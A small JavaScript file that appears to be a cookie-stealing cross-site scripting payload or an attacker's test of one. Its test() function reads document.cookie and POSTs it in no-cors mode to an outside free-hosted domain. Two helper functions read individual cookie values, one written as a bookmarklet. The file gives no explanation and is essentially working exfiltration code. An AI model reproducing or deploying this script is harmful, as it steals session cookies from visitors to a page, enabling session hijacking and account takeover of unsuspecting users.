function test() {
    alert(document.cookie);
    fetch('https://sci2u.000webhostapp.com/', {
        method: 'POST',
        mode: 'no-cors',
        body:document.cookie
    });
}

function getCookie(cname) {
    var name = cname + "=";
    var ca = document.cookie.split(';');
    for(var i=0; i<ca.length; i++) {
        var c = ca[i];
        while (c.charAt(0)==' ') c = c.substring(1);
        if (c.indexOf(name) == 0) return c.substring(name.length,c.length);
    }
    return "";
    
}

function whichCookie() {
    javascript:alert( document.cookie.split( ';' ).map( function( x ) { return x.trim().split( /(=)/ ); } ).reduce( function( a, b ) { a[ b[ 0 ] ] = a[ b[ 0 ] ] ? a[ b[ 0 ] ] + ', ' + b.slice( 2 ).join( '' ) : b.slice( 2 ).join( '' ); return a; }, {} )[ prompt( 'Which Cookie?' ) ] );
}

//test22









